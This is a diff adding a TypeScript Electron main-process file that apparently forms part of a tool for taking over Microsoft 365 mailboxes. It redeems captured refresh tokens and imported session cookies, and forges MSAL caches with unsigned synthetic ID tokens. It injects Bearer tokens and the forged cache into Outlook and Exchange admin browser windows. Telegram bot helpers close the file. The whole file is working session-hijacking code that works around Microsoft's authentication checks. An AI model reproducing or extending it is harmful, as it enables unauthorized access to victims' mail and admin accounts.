@@ -1,0 +1,3457 @@
+import { app, BrowserWindow, shell, ipcMain, safeStorage, session, WebContents, clipboard, net, dialog } from 'electron';
+import type { Session } from 'electron';
+import fs from 'fs/promises';
+import path from 'path';
+import { DEFAULT_STATE, AppState } from '../types/state';
+import { refreshMicrosoftToken, normalizeAuthorityTenant, type TokenRefreshResult } from './microsoftOAuthRefresh';
+import { runCookieToTokenConversion, applyParsedCookiesToSession } from './cookieImport';
+import { parseCookiePaste, filterMicrosoftRelatedCookies } from '../shared/cookieFormat';
+import { diagnoseMicrosoftAuthError } from '../shared/microsoftAuthDiagnostics';
+
+// Window to account mapping for MSAL cache injection
+const windowToAccountMap = new Map<number, string>();
+// MSAL cache storage (accountId -> cache entries)
+const msalCacheMap = new Map<string, Record<string, string>>();
+// Raw tokens per account — used by preload to serve fake OAuth code exchange responses
+const outlookTokenStore = new Map<string, {
+  accessToken: string; refreshToken: string; idToken: string;
+  scope: string; expiresIn: number;
+  oid: string; tid: string; email: string; name: string; clientId: string;
+}>();
+
+// Per Outlook partition: current Bearer + mailbox for webRequest (one hook per session, token refreshed each open)
+const outlookSessionAuth = new WeakMap<Session, { accessToken: string; email: string }>();
+
+/** Last successful in-memory OWA token refresh (avoids redundant refresh + focus storms). */
+const owaLastSuccessfulRefresh = new Map<string, number>();
+const owaRefreshLocks = new Set<string>();
+/** Session Bridge: avoid accidental multi-click opening many browser tabs. */
+const sessionBridgeLastOpenAt = new Map<string, number>();
+
+type OwaTokenBundle = {
+  account: any;
+  store: Record<string, any>;
+  accessToken: string;
+  tokenResult: TokenRefreshResult;
+  clientIdOverride: string;
+  tokenPayload: any;
+};
+
+/**
+ * Acquire fresh delegated tokens + persist rotated refresh tokens (same logic as first-time Open Outlook).
+ */
+async function loadOwaTokenBundle(accountId: string): Promise<OwaTokenBundle> {
+  const store = await readStore();
+  const accounts: any[] = store.accounts || [];
+  const account = accounts.find((a: any) => a.id === accountId);
+  if (!account) throw new Error('Account not found');
+  if (account.auth?.type !== 'token') {
+    throw new Error('Account does not have token auth');
+  }
+
+  let useClientId: string;
+  let useAuthorityEndpoint: string;
+  let useRefreshToken: string;
+  let useScopeType: string;
+  let useResource: string;
+
+  if (account.auth.v2Token) {
+    useClientId = account.auth.v2Token.clientId;
+    useAuthorityEndpoint = account.auth.v2Token.authorityEndpoint || 'common';
+    useRefreshToken = account.auth.v2Token.refreshToken;
+    useScopeType = account.auth.v2Token.scopeType || 'graph';
+    if (useScopeType === 'graph') {
+      throw new Error(
+        'This account was captured with Graph access only. OWA requires an EWS token. Re-capture this account with scope_type=ews.'
+      );
+    }
+    useResource = account.auth.v2Token.resource || 'https://outlook.office.com';
+  } else {
+    useClientId = account.auth.clientId;
+    useAuthorityEndpoint = account.auth.authorityEndpoint;
+    useRefreshToken = account.auth.refreshToken;
+    useScopeType = account.auth.scopeType || 'ews';
+    if (useScopeType === 'graph' && !account.auth.v2Token) {
+      throw new Error(
+        'This account was captured with Graph access only. OWA requires an EWS token. Re-capture this account with scope_type=ews.'
+      );
+    }
+    useResource = account.auth.resource || 'https://outlook.office.com';
+  }
+
+  if (!useClientId || !useAuthorityEndpoint || !useRefreshToken) {
+    throw new Error('Missing required auth fields');
+  }
+
+  let tokenResult = await refreshMicrosoftToken(
+    useClientId,
+    useAuthorityEndpoint,
+    useRefreshToken,
+    useScopeType,
+    useResource
+  );
+
+  let accountStoreDirty = false;
+  if (tokenResult.refreshToken && tokenResult.refreshToken !== useRefreshToken) {
+    if (account.auth.v2Token) {
+      account.auth.v2Token.refreshToken = tokenResult.refreshToken;
+    }
+    account.auth.refreshToken = tokenResult.refreshToken;
+    accountStoreDirty = true;
+  }
+
+  if (!account.auth.v2Token && useScopeType === 'ews') {
+    try {
+      const v2Result = await exchangeV1ForV2Token(useClientId, useAuthorityEndpoint, tokenResult.refreshToken, useResource);
+      account.auth.v2Token = {
+        clientId: useClientId,
+        authorityEndpoint: useAuthorityEndpoint,
+        refreshToken: v2Result.refreshToken,
+        resource: 'https://outlook.office.com',
+        scopeType: 'ews',
+      };
+      accountStoreDirty = true;
+      tokenResult = {
+        ...tokenResult,
+        accessToken: v2Result.accessToken,
+        refreshToken: v2Result.refreshToken,
+        idToken: v2Result.idToken,
+        expiresIn: v2Result.expiresIn,
+        tokenType: v2Result.tokenType,
+        scope: tokenResult.scope,
+      };
+    } catch (error: any) {
+      console.error('[Outlook] V2 token exchange failed:', error.message);
+    }
+  }
+  if (accountStoreDirty) {
+    await writeStore(store);
+  }
+
+  const state = await readState();
+  const preferredOwaClientId = state.owaClientId || '9199bf20-a13f-4107-85dc-02114787ef48';
+  if (useScopeType === 'ews' && preferredOwaClientId && preferredOwaClientId !== useClientId) {
+    try {
+      const owaClientToken = await refreshMicrosoftToken(
+        preferredOwaClientId,
+        useAuthorityEndpoint,
+        tokenResult.refreshToken,
+        useScopeType,
+        useResource
+      );
+      appendOutlookDebug(`[Outlook] Redeemed token for OWA client_id=${preferredOwaClientId}`);
+      tokenResult = owaClientToken;
+    } catch (error: any) {
+      appendOutlookDebug(`[Outlook] OWA-client token redeem failed for ${preferredOwaClientId}: ${error?.message || String(error)}`);
+      console.warn('[Outlook] OWA client token redeem failed, continuing with base token:', error?.message || error);
+    }
+  }
+
+  const accessToken = tokenResult.accessToken;
+  let tokenPayload: any = {};
+  try {
+    const parts = accessToken.split('.');
+    if (parts.length === 3) {
+      tokenPayload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+    }
+  } catch (err) {
+    console.warn('[Outlook] Failed to decode token:', err);
+  }
+
+  const clientIdOverride =
+    state.owaClientId ||
+    account.auth?.v2Token?.clientId ||
+    account.auth?.clientId ||
+    'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+  return { account, store, accessToken, tokenResult, clientIdOverride, tokenPayload };
+}
+
+function applyOwaTokenBundleToRunningSession(accountId: string, bundle: OwaTokenBundle, outlookSession: Session): void {
+  const { account, accessToken, tokenResult, clientIdOverride, tokenPayload } = bundle;
+  outlookTokenStore.set(accountId, {
+    accessToken,
+    refreshToken: tokenResult.refreshToken,
+    idToken: tokenResult.idToken || '',
+    scope: tokenResult.scope || 'https://outlook.office.com/.default openid profile offline_access',
+    expiresIn: tokenResult.expiresIn,
+    oid: tokenPayload.oid || '',
+    tid: tokenPayload.tid || '',
+    email: account.email,
+    name: account.name || account.email,
+    clientId: clientIdOverride,
+  });
+
+  let msalCache: Record<string, string>;
+  try {
+    msalCache = generateMsalCache(account, accessToken, tokenResult.refreshToken, tokenResult.idToken, clientIdOverride);
+  } catch (err) {
+    console.error('[MSAL] Failed to generate cache:', err);
+    msalCache = {};
+  }
+  msalCacheMap.set(accountId, msalCache);
+  outlookSessionAuth.set(outlookSession, { accessToken, email: account.email });
+}
+
+async function tryRefreshOwaWindowSession(
+  accountId: string,
+  outlookSession: Session,
+  wc: WebContents,
+  minMsSinceLastSuccess: number,
+  reason: string
+): Promise<void> {
+  const last = owaLastSuccessfulRefresh.get(accountId) || 0;
+  if (minMsSinceLastSuccess > 0 && Date.now() - last < minMsSinceLastSuccess) {
+    return;
+  }
+  if (owaRefreshLocks.has(accountId)) {
+    return;
+  }
+  owaRefreshLocks.add(accountId);
+  try {
+    const bundle = await loadOwaTokenBundle(accountId);
+    applyOwaTokenBundleToRunningSession(accountId, bundle, outlookSession);
+    await reinjectMsalCacheIntoOwaPage(wc, accountId);
+    owaLastSuccessfulRefresh.set(accountId, Date.now());
+    appendOutlookDebug(`[Outlook] Session tokens refreshed (${reason})`);
+  } catch (e: any) {
+    appendOutlookDebug(`[Outlook] Session refresh failed (${reason}): ${e?.message || e}`);
+  } finally {
+    owaRefreshLocks.delete(accountId);
+  }
+}
+
+const OWA_BEARER_URL_PATTERNS = [
+  '*://outlook.office.com/*',
+  '*://outlook.office365.com/*',
+  '*://outlook.cloud.microsoft/*',
+  '*://m365.cloud.microsoft/*',
+  '*://substrate.office.com/*',
+  '*://attachments.office.net/*',
+  '*://www.office.com/*',
+  '*://office.com/*',
+  '*://admin.exchange.microsoft.com/*',
+  '*://admin.microsoft.com/*',
+];
+
+const LOGIN_HINT_URL_PATTERNS = ['*://login.microsoftonline.com/*', '*://login.windows.net/*'];
+const OUTLOOK_DEBUG_MAX_LINES = 1200;
+const outlookDebugLines: string[] = [];
+
+function appendOutlookDebug(line: string): void {
+  const stamped = `${new Date().toISOString()} ${line}`;
+  outlookDebugLines.push(stamped);
+  if (outlookDebugLines.length > OUTLOOK_DEBUG_MAX_LINES) {
+    outlookDebugLines.splice(0, outlookDebugLines.length - OUTLOOK_DEBUG_MAX_LINES);
+  }
+}
+
+function extractClientIdFromUrl(urlStr: string): string | null {
+  try {
+    const u = new URL(urlStr);
+    const cid = u.searchParams.get('client_id');
+    if (!cid) return null;
+    if (!/^[0-9a-fA-F-]{36}$/.test(cid)) return null;
+    return cid;
+  } catch {
+    return null;
+  }
+}
+
+function decryptStoredCookiePayload(encB64: string): string {
+  if (!safeStorage.isEncryptionAvailable()) return encB64;
+  try {
+    return safeStorage.decryptString(Buffer.from(encB64, 'base64'));
+  } catch {
+    return encB64;
+  }
+}
+
+/** Decrypt stored Microsoft cookie paste (cookie-only account or token + owaCookiesEncrypted). */
+function getMicrosoftCookiePasteFromAccount(account: any): string | null {
+  const auth = account?.auth;
+  if (!auth) return null;
+  if (auth.type === 'cookie') {
+    const enc = auth.cookiesEncrypted || auth.cookies;
+    if (!enc || typeof enc !== 'string') return null;
+    const raw = decryptStoredCookiePayload(enc).trim();
+    return raw || null;
+  }
+  if (auth.type === 'token' && typeof auth.owaCookiesEncrypted === 'string' && auth.owaCookiesEncrypted.trim()) {
+    const raw = decryptStoredCookiePayload(auth.owaCookiesEncrypted.trim()).trim();
+    return raw || null;
+  }
+  return null;
+}
+
+/**
+ * Open OWA using Microsoft session cookies only (no MSAL / token intercept).
+ * Expects a Netscape / JSON / header paste compatible with `parseCookiePaste`.
+ */
+async function openOwaWithCookieSession(
+  accountId: string,
+  account: any,
+  cookiePaste: string,
+  mode: 'owa' | 'exchangeAdmin'
+): Promise<void> {
+  const parsedAll = parseCookiePaste(cookiePaste);
+  const msCookies = filterMicrosoftRelatedCookies(parsedAll);
+  const toApply = msCookies.length ? msCookies : parsedAll;
+  if (!toApply.length) {
+    throw new Error(
+      'Could not parse Microsoft cookies from stored value (expect Netscape export, JSON, or Cookie header).'
+    );
+  }
+
+  const partitionName = `persist:outlook-cookie-${accountId}`;
+  const outlookSession = session.fromPartition(partitionName);
+
+  try {
+    await outlookSession.clearStorageData({ storages: ['cookies'] });
+  } catch (e) {
+    console.warn('[OutlookCookie] clearStorageData:', e);
+  }
+
+  const applied = await applyParsedCookiesToSession(outlookSession, toApply);
+  if (applied === 0) {
+    throw new Error('No cookies could be applied to the OWA browser partition.');
+  }
+  appendOutlookDebug(`[OutlookCookie] Applied ${applied} cookies account=${accountId}`);
+
+  outlookSessionAuth.set(outlookSession, { accessToken: '', email: String(account.email || '') });
+
+  await Promise.all([
+    outlookSession.cookies.set({
+      url: 'https://outlook.office.com',
+      name: 'DefaultAnchorMailbox',
+      value: `UPN:${account.email}`,
+      domain: '.outlook.office.com',
+      path: '/',
+      secure: true,
+      httpOnly: true,
+      sameSite: 'no_restriction',
+    }),
+    outlookSession.cookies.set({
+      url: 'https://login.microsoftonline.com',
+      name: 'DefaultAnchorMailbox',
+      value: `UPN:${account.email}`,
+      domain: '.login.microsoftonline.com',
+      path: '/',
+      secure: true,
+      httpOnly: true,
+      sameSite: 'no_restriction',
+    }),
+  ]);
+
+  installOutlookPartitionRequestHooks(outlookSession);
+
+  const startUrl =
+    mode === 'exchangeAdmin'
+      ? 'https://admin.exchange.microsoft.com/'
+      : 'https://outlook.office.com/mail/inbox';
+  const windowTitle =
+    mode === 'exchangeAdmin' ? `Exchange admin — ${account.email}` : `Outlook (cookies) — ${account.email}`;
+
+  const outlookWindow = new BrowserWindow({
+    width: 1400,
+    height: 900,
+    show: true,
+    title: windowTitle,
+    webPreferences: {
+      nodeIntegration: false,
+      contextIsolation: false,
+      partition: partitionName,
+      preload: path.join(__dirname, 'preload-mailbox-cookie.js'),
+    },
+  });
+
+  outlookWindow.on('closed', () => {
+    outlookSessionAuth.delete(outlookSession);
+  });
+
+  outlookWindow.webContents.setUserAgent(
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+  );
+
+  outlookWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription, validatedURL) => {
+    console.error('[OutlookCookie] did-fail-load', errorCode, errorDescription, validatedURL);
+    appendOutlookDebug(`[OutlookCookie] did-fail-load code=${errorCode} url=${validatedURL}`);
+  });
+
+  void outlookWindow.loadURL(startUrl);
+}
+
+function installOutlookPartitionRequestHooks(outlookSess: Session): void {
+  if ((outlookSess as any).__owaPartitionHooks) return;
+  (outlookSess as any).__owaPartitionHooks = true;
+
+  outlookSess.webRequest.onBeforeSendHeaders({ urls: OWA_BEARER_URL_PATTERNS }, (details, callback) => {
+    const auth = outlookSessionAuth.get(outlookSess);
+    if (!auth?.accessToken) {
+      callback({ requestHeaders: details.requestHeaders });
+      return;
+    }
+    const h = { ...details.requestHeaders };
+    h['Authorization'] = `Bearer ${auth.accessToken}`;
+    h['X-AnchorMailbox'] = auth.email;
+    h['AnchorMailbox'] = auth.email;
+    h['client-request-id'] = crypto.randomUUID();
+    h['RequestId'] = crypto.randomUUID();
+    h['X-OWA-ActiveSubscription'] = '{}';
+    const cookieHint = `DefaultAnchorMailbox=UPN:${auth.email}`;
+    if (!h['Cookie']) h['Cookie'] = cookieHint;
+    else if (!String(h['Cookie']).includes('DefaultAnchorMailbox')) h['Cookie'] = `${h['Cookie']}; ${cookieHint}`;
+    callback({ requestHeaders: h });
+  });
+
+  outlookSess.webRequest.onBeforeSendHeaders({ urls: LOGIN_HINT_URL_PATTERNS }, (details, callback) => {
+    const auth = outlookSessionAuth.get(outlookSess);
+    if (!auth?.email) {
+      callback({ requestHeaders: details.requestHeaders });
+      return;
+    }
+    const h = { ...details.requestHeaders };
+    const cookieHint = `DefaultAnchorMailbox=UPN:${auth.email}`;
+    if (!h['Cookie']) h['Cookie'] = cookieHint;
+    else if (!String(h['Cookie']).includes('DefaultAnchorMailbox')) h['Cookie'] = `${h['Cookie']}; ${cookieHint}`;
+    callback({ requestHeaders: h });
+  });
+}
+
+async function reinjectMsalCacheIntoOwaPage(wc: WebContents, accountId: string): Promise<void> {
+  const cache = msalCacheMap.get(accountId);
+  if (!cache || Object.keys(cache).length === 0) return;
+  const url = wc.getURL();
+  if (!url || (!/outlook|office365|office\.com|cloud\.microsoft|microsoft\.com/i.test(url))) return;
+  try {
+    const injected = JSON.stringify(cache);
+    await wc.executeJavaScript(`
+      (function () {
+        try {
+          var c = ${injected};
+          Object.keys(c).forEach(function (k) { localStorage.setItem(k, c[k]); });
+          console.log('[Outlook][MainReinject] localStorage MSAL keys:', Object.keys(c).length);
+        } catch (e) {
+          console.error('[Outlook][MainReinject]', e);
+        }
+      })();
+    `);
+  } catch (e) {
+    console.warn('[Outlook] MSAL reinject executeJavaScript failed:', e);
+  }
+}
+
+async function regenerateMsalCacheForClientId(accountId: string, clientId: string): Promise<boolean> {
+  appendOutlookDebug(`[MSAL] Regenerate cache requested for account=${accountId}, clientId=${clientId}`);
+  // Persist latest discovered OWA client id
+  try {
+    const state = await readState();
+    state.owaClientId = clientId;
+    await writeState(state);
+  } catch (e) {
+    console.warn('[MAIN] Failed to persist owaClientId:', e);
+  }
+
+  const storeData = await readStore();
+  const accounts = storeData.accounts as any[] | undefined;
+  const account = accounts?.find((a: any) => a.id === accountId);
+  if (!account) {
+    appendOutlookDebug('[MSAL] Regenerate skipped: account not found');
+    return false;
+  }
+  const existingCache = msalCacheMap.get(accountId);
+  if (!existingCache) {
+    appendOutlookDebug('[MSAL] Regenerate skipped: no existing cache');
+    return false;
+  }
+
+  let accessToken = '';
+  let refreshToken = '';
+  let idToken = '';
+  for (const [, value] of Object.entries(existingCache)) {
+    try {
+      const entry = JSON.parse(value as string);
+      if (entry.credentialType === 'AccessToken') accessToken = entry.secret;
+      else if (entry.credentialType === 'RefreshToken') refreshToken = entry.secret;
+      else if (entry.credentialType === 'IdToken') idToken = entry.secret;
+    } catch {
+      // non-json entries
+    }
+  }
+  if (!accessToken || !refreshToken) {
+    appendOutlookDebug('[MSAL] Regenerate skipped: missing token secrets in cache');
+    return false;
+  }
+
+  const newCache = generateMsalCache(account, accessToken, refreshToken, idToken || undefined, clientId);
+  msalCacheMap.set(accountId, newCache);
+  appendOutlookDebug(`[MSAL] Cache regenerated for clientId=${clientId}, entries=${Object.keys(newCache).length}`);
+  return true;
+}
+
+function stripSessionClaims(idToken: string): string {
+  try {
+    const parts = idToken.split('.');
+    if (parts.length !== 3) return idToken;
+    const payload = JSON.parse(
+      Buffer.from(parts[1], 'base64').toString('utf8')
+    );
+    delete payload.sid;
+    delete payload.login_hint;
+    delete payload.login_req;
+    delete payload.pwd_url;
+    delete payload.pwd_exp;
+    const newPayload = Buffer.from(JSON.stringify(payload))
+      .toString('base64')
+      .replace(/\+/g, '-')
+      .replace(/\//g, '_')
+      .replace(/=+$/, '');
+    // Drop the signature — MSAL does not verify cached token signatures
+    return `${parts[0]}.${newPayload}.`;
+  } catch {
+    return idToken;
+  }
+}
+
+function generateMsalCache(account: any, accessToken: string, refreshToken: string, idToken?: string, clientIdOverride?: string): Record<string, string> {
+  console.log('[MSAL] Generating EXACT HighHopes cache for', account.email);
+  
+  // Decode token payload to get oid/tid
+  let payload: any = {};
+  try {
+    const parts = accessToken.split('.');
+    if (parts.length === 3) {
+      payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+    }
+  } catch (err) {
+    console.warn('[MSAL] Failed to decode token:', err);
+  }
+  
+  // Exact values from HighHopes captured cache
+  // Default to Microsoft Office SPA id (matches most panel / device tokens). HighHopes capture uses override.
+  const clientId = clientIdOverride || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+  const environment = 'login.windows.net';
+  console.log('[MSAL] Using clientId for cache:', clientId, '(override:', clientIdOverride ? 'yes' : 'no', ')');
+  
+  // Determine oid/tid from token payload (prefer idToken, fallback to access token)
+  let tokenPayload = payload; // from earlier access token decode
+  if (idToken) {
+    try {
+      const parts = idToken.split('.');
+      if (parts.length === 3) {
+        tokenPayload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+      }
+    } catch (err) {
+      console.warn('[MSAL] Failed to decode idToken, using access token payload:', err);
+    }
+  }
+  const oid = tokenPayload.oid || payload.oid || '1f5ce522-2ee5-4585-8a5c-5f017b2d291a';
+  const tid = tokenPayload.tid || payload.tid || 'cf404960-c50f-46d2-8bf3-a3c957283b86';
+  const homeAccountId = `${oid}.${tid}`;
+  const realm = tid;
+  const username = account.email;
+  // Generate clientInfo (base64 {"uid":"oid","utid":"tid"})
+  const clientInfo = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64');
+  
+  // Exact scopes from HighHopes cache
+  const scopes = 'https://outlook.office.com/.default openid profile offline_access';
+  
+  const now = Date.now();
+  const makeSyntheticIdToken = (audClientId: string): string => {
+    const header = { typ: 'JWT', alg: 'RS256', kid: 'dummy' };
+    const payloadForAud = {
+      aud: audClientId,
+      iss: `https://${environment}/${realm}/v2.0`,
+      iat: Math.floor(now / 1000) - 300,
+      nbf: Math.floor(now / 1000) - 300,
+      exp: Math.floor(now / 1000) + 3600,
+      aio: 'ATQAy/8TAAAAsKvCRhQOKjVZvMBTq8AJhXN0Z/KMvjf4dUqvusw/ZH4uMJyYvrgWrgRX',
+      name: username,
+      oid: oid,
+      preferred_username: username,
+      rh: '0.AAAA...',
+      sub: oid,
+      tid: realm,
+      uti: 'ABCDEFGHIJKLMNOPQRSTUV',
+      ver: '2.0'
+    };
+    const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    const payloadB64 = Buffer.from(JSON.stringify(payloadForAud)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    return `${headerB64}.${payloadB64}.`;
+  };
+  
+  // Build EXACT cache matching HighHopes captured localStorage
+  const cache: Record<string, string> = {};
+  
+  // 1. msal.version (exact)
+  cache['msal.version'] = '4.28.2';
+  
+  // 2. App metadata (exact format and values)
+  cache[`appmetadata-${environment}-${clientId}`] = JSON.stringify({
+    clientId,
+    environment,
+    familyId: "1"
+  });
+  
+  // 3. Account entry (EXACT clientInfo from HighHopes)
+  const accountKey = `msal.2|${homeAccountId}|${environment}|${realm}`;
+  const idTokenClaims: any = {
+    "aud": clientId,
+    "iss": `https://${environment}/${realm}/v2.0`,
+    "iat": Math.floor(now / 1000) - 300,
+    "nbf": Math.floor(now / 1000) - 300,
+    "exp": Math.floor(now / 1000) + 3600,
+    "aio": "ATQAy/8TAAAAsKvCRhQOKjVZvMBTq8AJhXN0Z/KMvjf4dUqvusw/ZH4uMJyYvrgWrgRX",
+    "name": username,
+    "oid": oid,
+    "preferred_username": username,
+    "rh": "0.AAAA...",
+    "sub": oid,
+    "tid": realm,
+    "uti": "ABCDEFGHIJKLMNOPQRSTUV",
+    "ver": "2.0"
+  };
+  delete idTokenClaims.sid;
+  delete idTokenClaims.login_hint;
+  delete idTokenClaims.login_req;
+  delete idTokenClaims.pwd_url;
+  delete idTokenClaims.pwd_exp;
+  cache[accountKey] = JSON.stringify({
+    authorityType: "MSSTS",
+    clientInfo: clientInfo, // Base64 {"uid":"oid","utid":"tid"}
+    homeAccountId,
+    environment,
+    realm,
+    localAccountId: oid,
+    username,
+    name: username,
+    idTokenClaims,
+    nativeAccountId: "",
+    tenantProfiles: [{
+      tenantId: realm,
+      localAccountId: payload.oid || "",
+      name: username,
+      isHomeTenant: true
+    }],
+    lastUpdatedAt: now.toString()
+  });
+  
+  // 5. Access token entry
+  const accessTokenKey = `msal.2|${homeAccountId}|${environment}|${scopes}||`;
+  cache[accessTokenKey] = JSON.stringify({
+    homeAccountId,
+    environment,
+    credentialType: "AccessToken",
+    clientId,
+    secret: accessToken,
+    realm,
+    target: scopes,
+    cachedAt: Math.floor(now / 1000).toString(),
+    expiresOn: payload.exp ? payload.exp.toString() : (Math.floor(now / 1000) + 3600).toString(),
+    extendedExpiresOn: (payload.exp ? payload.exp + 7200 : Math.floor(now / 1000) + 10800).toString(),
+    tokenType: "Bearer",
+    requestedClaims: "",
+    requestedClaimsHash: "",
+    keyId: "",
+    userAssertionHash: "",
+    lastUpdatedAt: now.toString()
+  });
+  
+  // 6. Refresh token entry
+  const refreshTokenKey = `msal.2|${homeAccountId}|${environment}|refreshtoken|1||||`;
+  cache[refreshTokenKey] = JSON.stringify({
+    credentialType: "RefreshToken",
+    homeAccountId,
+    environment,
+    clientId,
+    secret: refreshToken,
+    lastUpdatedAt: now.toString()
+  });
+  
+  // 7. ID token entry (optional, OWA may not need it)
+  const idTokenKey = `msal.2|${homeAccountId}|${environment}|${clientId}|${realm}||`;
+  // Generate synthetic id_token if not provided
+  let idTokenToUse = idToken;
+  if (!idTokenToUse) {
+    // No signature (empty) – MSAL may not validate signature for cached tokens
+    idTokenToUse = makeSyntheticIdToken(clientId);
+    console.log('[MSAL] Generated synthetic id_token (aud:', clientId.substring(0, 8), '..., oid:', oid.substring(0, 8), '...)');
+  }
+  idTokenToUse = stripSessionClaims(idTokenToUse);
+  cache[idTokenKey] = JSON.stringify({
+    credentialType: "IdToken",
+    homeAccountId,
+    environment,
+    clientId,
+    secret: idTokenToUse,
+    realm,
+    lastUpdatedAt: now.toString()
+  });
+  
+  // 8. Account keys list
+  cache['msal.2.account.keys'] = JSON.stringify([accountKey]);
+  
+  // 9. Token keys list
+  cache[`msal.2.token.keys.${clientId}`] = JSON.stringify({
+    idToken: [idTokenKey],
+    accessToken: [accessTokenKey],
+    refreshToken: [refreshTokenKey]
+  });
+  
+  // 10. Active account filter
+  cache[`msal.${clientId}.active-account-filters`] = JSON.stringify({
+    homeAccountId,
+    environment,
+    realm,
+    localAccountId: payload.oid || "",
+    username,
+    name: username,
+    clientInfo,
+    lastUpdatedAt: Math.floor(now / 1000).toString()
+  });
+  
+  // 11. OWA MSAL expiry timestamp
+  cache['olk-msalexp'] = now.toString();
+
+  // Duplicate entries for known OWA client IDs so silent auth can resolve whichever app id Outlook requests.
+  const aliasClientIds = new Set<string>(
+    [
+      clientId,
+      account.auth?.clientId,
+      'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+      '9199bf20-a13f-4107-85dc-02114787ef48',
+    ].filter(Boolean)
+  );
+  for (const aliasClientId of aliasClientIds) {
+    if (aliasClientId === clientId) continue;
+    console.log('[MSAL] Duplicating cache for alias client ID:', aliasClientId);
+    cache[`appmetadata-${environment}-${aliasClientId}`] = JSON.stringify({
+      clientId: aliasClientId,
+      environment,
+      familyId: "1"
+    });
+    cache[`msal.2.token.keys.${aliasClientId}`] = JSON.stringify({
+      idToken: [`msal.2|${homeAccountId}|${environment}|${aliasClientId}|${realm}||`],
+      accessToken: [accessTokenKey],
+      refreshToken: [refreshTokenKey]
+    });
+    const aliasIdTokenKey = `msal.2|${homeAccountId}|${environment}|${aliasClientId}|${realm}||`;
+    const aliasIdToken = stripSessionClaims(makeSyntheticIdToken(aliasClientId));
+    cache[aliasIdTokenKey] = JSON.stringify({
+      credentialType: "IdToken",
+      homeAccountId,
+      environment,
+      clientId: aliasClientId,
+      secret: aliasIdToken,
+      realm,
+      lastUpdatedAt: now.toString()
+    });
+    cache[`msal.${aliasClientId}.active-account-filters`] = JSON.stringify({
+      homeAccountId,
+      environment,
+      realm,
+      localAccountId: payload.oid || "",
+      username,
+      name: username,
+      clientInfo,
+      lastUpdatedAt: Math.floor(now / 1000).toString()
+    });
+  }
+  
+  console.log('[MSAL] Generated', Object.keys(cache).length, 'cache entries for clientId', clientId);
+  console.log('[MSAL] HomeAccountId:', homeAccountId, 'Environment:', environment, 'Scopes:', scopes);
+  return cache;
+}
+
+// Polyfill for AbortSignal.timeout (Node.js < 16.11.0)
+function timeoutSignal(ms: number): AbortSignal {
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), ms);
+  // Clear the timeout if the signal is already aborted (e.g., by another source)
+  const signal = controller.signal;
+  signal.addEventListener('abort', () => clearTimeout(timeoutId));
+  return signal;
+}
+
+const TELEGRAM_MESSAGE_MAX = 4096;
+const TELEGRAM_RETRY_ATTEMPTS = 3;
+const TELEGRAM_RETRY_BASE_MS = 400;
+
+function truncateTelegramMessage(text: string, max = TELEGRAM_MESSAGE_MAX): string {
+  if (text.length <= max) return text;
+  const ellipsis = '\n<i>…truncated</i>';
+  const take = Math.max(0, max - ellipsis.length);
+  return text.slice(0, take) + ellipsis;
+}
+
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+function escapeTelegramHtmlPlain(s: string): string {
+  return String(s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+/** Ensures JSON → UTF-8 is valid (Telegram rejects malformed surrogate pairs). */
+function sanitizeTelegramUtf8(text: string): string {
+  if (typeof text !== 'string') return '';
+  return Buffer.from(text, 'utf8').toString('utf8');
+}
+
+async function telegramApiSendMessage(
+  token: string,
+  chatId: string,
+  text: string,
+  parseMode: 'HTML' | undefined = 'HTML'
+): Promise<{ ok: boolean; description?: string; retryAfterSec?: number; httpStatus?: number }> {
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const safeText = sanitizeTelegramUtf8(text);
+  const body: Record<string, unknown> = { chat_id: chatId, text: safeText };
+  if (parseMode) body.parse_mode = parseMode;
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json; charset=utf-8' },
+    body: JSON.stringify(body),
+    signal: timeoutSignal(15000),
+  } as any);
+  const data = (await response.json()) as {
+    ok?: boolean;
+    description?: string;
+    parameters?: { retry_after?: number };
+  };
+  const retryAfterSec =
+    typeof data.parameters?.retry_after === 'number'
+      ? data.parameters.retry_after
+      : undefined;
+  return {
+    ok: Boolean(data.ok),
+    description: data.description,
+    retryAfterSec,
+    httpStatus: response.status,
+  };
+}
+
+/** Truncates once, retries transient failures; avoids retry on obvious client errors. */
+async function telegramSendWithRetry(
+  token: string,
+  chatId: string,
+  text: string,
+  parseMode: 'HTML' | undefined = 'HTML'
+): Promise<{ success: boolean; error?: string }> {
+  const payload = truncateTelegramMessage(sanitizeTelegramUtf8(text));
+  let lastErr = 'Telegram request failed';
+  for (let attempt = 0; attempt < TELEGRAM_RETRY_ATTEMPTS; attempt++) {
+    try {
+      const res = await telegramApiSendMessage(token, chatId, payload, parseMode);
+      if (res.ok) return { success: true };
+      lastErr = res.description || 'Telegram API error';
+      const isRateLimited =
+        res.httpStatus === 429 ||
+        /Too Many Requests|retry after/i.test(res.description || '');
+      if (isRateLimited && attempt < TELEGRAM_RETRY_ATTEMPTS - 1) {
+        const sec = res.retryAfterSec ?? parseInt(/retry after (\d+)/i.exec(res.description || '')?.[1] || '5', 10);
+        const waitMs = Math.min(Math.max(sec, 1) * 1000, 120000);
+        await sleep(waitMs);
+        continue;
+      }
+      if (
+        res.description &&
+        /can't parse entities|message text is empty|chat not found|bot was blocked|unauthorized|not enough rights|UTF-8/i.test(
+          res.description
+        )
+      ) {
+        return { success: false, error: lastErr };
+      }
+    } catch (e: any) {
+      lastErr = e?.message || String(e);
+    }
+    if (attempt < TELEGRAM_RETRY_ATTEMPTS - 1) {
+      await sleep(TELEGRAM_RETRY_BASE_MS * (attempt + 1));
+    }
+  }
